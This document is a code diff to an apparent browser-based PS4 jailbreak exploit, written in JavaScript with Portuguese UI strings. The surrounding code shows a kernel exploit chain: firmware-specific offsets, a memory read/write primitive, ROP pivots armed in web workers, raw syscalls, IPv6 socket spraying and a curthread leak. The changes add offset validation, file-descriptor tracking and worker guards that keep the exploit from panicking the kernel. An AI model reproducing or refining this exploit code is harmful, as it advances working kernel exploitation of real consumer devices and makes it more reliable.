@@ -1,7 +1,7 @@
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
-import { offsetsFor } from "./ps4_offsets.js";
+import { offsetsFor, validateOffsets } from "./ps4_offsets.js";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -143,6 +143,51 @@ const SYS = {
 };
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
 const keepAlive = [];
+
+class ResourceLedger {
+  constructor(closeFn) {
+    this.closeFn = closeFn;
+    this.entries = new Map();
+  }
+
+  track(type, value, origin = "") {
+    if (value < 0) return value;
+    this.entries.set(value, { type, value, closed: false, origin });
+    return value;
+  }
+
+  get size() {
+    return this.entries.size;
+  }
+
+  get pendingCount() {
+    let count = 0;
+    for (const entry of this.entries.values()) {
+      if (!entry.closed) count++;
+    }
+    return count;
+  }
+
+  release(value) {
+    const entry = this.entries.get(value);
+    if (!entry || entry.closed) return 0;
+    entry.closed = true;
+    try {
+      return this.closeFn ? this.closeFn(value) : -1;
+    } catch (e) {
+      return -1;
+    }
+  }
+
+  teardownAll() {
+    let closedCount = 0;
+    for (const entry of this.entries.values()) {
+      if (!entry.closed && this.release(entry.value) === 0) closedCount++;
+    }
+    return closedCount;
+  }
+}
+
 let mainMf = null,
   mainOrig = null,
   mainArmed = false;
@@ -156,14 +201,26 @@ let allDone = false,
   alreadyRoot = false,
   kernelDataDirty = false;
 
+const WORKER_STATE = {
+  CREATED: "created",
+  ARMED: "armed",
+  KERNEL_ACTIVE: "kernel-active",
+  PARKED: "parked",
+  TAINTED: "tainted",
+};
+
 (async function () {
   try {
     sessionStorage.setItem("jb_session_state", "in_progress");
   } catch (e) {}
   let p = null;
 
-  const opened = [];
   let closeFd = null;
+  let w1 = null,
+    w2 = null;
+  const resourceLedger = new ResourceLedger((fd) =>
+    closeFd ? closeFd(fd) : -1,
+  );
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
     mark("FW", key || "(not a PS4 UA)");
@@ -172,6 +229,15 @@ let allDone = false,
       return;
     }
     const fwKey = key || "unknown";
+
+    const offValidation = validateOffsets(off, fwKey);
+    if (!offValidation.ok) {
+      mark("OFFSETS-INVALID", offValidation.errors.join("; "));
+      state("invalid offsets detected", "bad");
+      setStageUI(1, "OFFSETS INVÁLIDOS", offValidation.errors.slice(0, 2).join("<br>"), "bad");
+      return;
+    }
+    mark("OFFSETS-SANITY", "all required keys present & 8-byte aligned");
 
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
@@ -653,9 +719,38 @@ let allDone = false,
     setStageUI(2, "ETAPA 2/4: Thread & Sockets", "Inicializando workers, vazando curthread e disparando spray de sockets IPv6...");
 
     async function bringWorker(name) {
-      const w = { name: name, armed: false, wired: false };
+      const w = {
+        name: name,
+        armed: false,
+        wired: false,
+        state: WORKER_STATE.CREATED,
+        tainted: false,
+      };
       w.worker = new Worker("rpc_worker.js");
       w.rpc = makeRpc(w.worker, name);
+      w.safeTerminate = function () {
+        if (
+          w.tainted ||
+          w.state === WORKER_STATE.KERNEL_ACTIVE ||
+          w.state === WORKER_STATE.TAINTED
+        ) {
+          mark(
+            "WORKER-TERMINATE-GUARD",
+            name + " is " + w.state + " (tainted); terminate() blocked to prevent KP",
+          );
+          return false;
+        }
+        if (w.worker) {
+          try {
+            w.worker.terminate();
+            w.worker = null;
+            return true;
+          } catch (e) {
+            return false;
+          }
+        }
+        return false;
+      };
       if ((await w.rpc("ping", 15000)) !== "pong")
         throw new Error(name + " ping");
       const sLo = 0x10100000,
@@ -692,6 +787,7 @@ let allDone = false,
       await w.rpc("setup", 15000, wl.low, wl.hi);
       await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
       w.armed = true;
+      w.state = WORKER_STATE.ARMED;
       w.ctx = makeCtx();
       w.fire = function (num, args, ms) {
         layout(w.ctx, stubAddr.get(num), args);
@@ -704,8 +800,12 @@ let allDone = false,
       };
       return w;
     }
-    const w1 = await bringWorker("w1");
-    const w2 = await bringWorker("w2");
+    w1 = await bringWorker("w1");
+    w2 = await bringWorker("w2");
+    w1.state = WORKER_STATE.KERNEL_ACTIVE;
+    w1.tainted = true;
+    w2.state = WORKER_STATE.KERNEL_ACTIVE;
+    w2.tainted = true;
     await w1.fire(SYS.getpid, []);
     const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
     await w2.fire(SYS.getpid, []);
@@ -744,7 +844,7 @@ let allDone = false,
       mark("PR-ABORT", "verify socket");
       return;
     }
-    opened.push(vs);
+    resourceLedger.track("fd", vs, "ipv6-probe");
     {
       const tAb = new ArrayBuffer(RTH_SIZE);
       keepAlive.push(tAb);
@@ -809,7 +909,8 @@ let allDone = false,
     }
     const bsp0 = bspDv.getInt32(0, true),
       bsp1 = bspDv.getInt32(4, true);
-    opened.push(bsp0, bsp1);
+    resourceLedger.track("fd", bsp0, "socketpair");
+    resourceLedger.track("fd", bsp1, "socketpair");
     const brbAb = new ArrayBuffer(0x40);
     keepAlive.push(brbAb);
     const brqAb = new ArrayBuffer(NBLOCK * 0x28);
@@ -972,7 +1073,8 @@ let allDone = false,
     }
     const sp0 = spDv.getInt32(0, true),
       sp1 = spDv.getInt32(4, true);
-    opened.push(sp0, sp1);
+    resourceLedger.track("fd", sp0, "socketpair");
+    resourceLedger.track("fd", sp1, "socketpair");
     const rbAb = new ArrayBuffer(0x40);
     keepAlive.push(rbAb);
     const rqAb = new ArrayBuffer(0x50);
@@ -1012,7 +1114,7 @@ let allDone = false,
       const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
       if (fd < 0) break;
       POOL.push(fd);
-      opened.push(fd);
+      resourceLedger.track("fd", fd, "ipv6-pool");
     }
     mark("PR-POOL", "reclaim sockets=" + POOL.length);
     const pAb = new ArrayBuffer(RTH_SIZE);
@@ -2112,7 +2214,7 @@ let allDone = false,
       KF_MARK = 0x41;
     const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
     if (kfSock >= 0) {
-      opened.push(kfSock);
+      resourceLedger.track("fd", kfSock, "kern-file-probe");
       const tAb = new ArrayBuffer(4);
       const tDv = new DataView(tAb);
       tDv.setInt32(0, KF_MARK, true);
@@ -3192,6 +3294,7 @@ let allDone = false,
             try {
               if (w1 && w1.worker) {
                 w1.worker.postMessage({ id: -2, name: "stopSpin", args: [] });
+                w1.state = WORKER_STATE.PARKED;
                 mark("PR-UNPARK", "w1 stopSpin posted -- worker loop disarmed");
               }
             } catch (error_) {
@@ -3427,17 +3530,29 @@ let allDone = false,
       mark("JB-RESTORE-THREW", (error_ && error_.message) || String(error_));
     }
     try {
-      if (opened.length && closeFd) {
-        let n = 0;
-        for (const fd of opened) {
-          try {
-            if (closeFd(fd) === 0) n++;
-          } catch (error_) {}
-        }
-        mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
+      if (resourceLedger.size && closeFd && mainArmed) {
+        const pending = resourceLedger.pendingCount;
+        const n = resourceLedger.teardownAll();
+        mark("STRAGGLERS-CLOSED", n + "/" + pending);
       }
     } catch (error_) {
       mark("CLOSE-THREW", (error_ && error_.message) || String(error_));
+    }
+    try {
+      if (w1) {
+        if (w1.worker && w1.state === WORKER_STATE.KERNEL_ACTIVE) {
+          try {
+            w1.worker.postMessage({ id: -2, name: "stopSpin", args: [] });
+          } catch {}
+          w1.state = WORKER_STATE.PARKED;
+        }
+        w1.safeTerminate();
+      }
+      if (w2) {
+        w2.safeTerminate();
+      }
+    } catch (error_) {
+      mark("WORKER-TEARDOWN-THREW", (error_ && error_.message) || String(error_));
     }
     try {
       if (pinRestore) pinRestore();
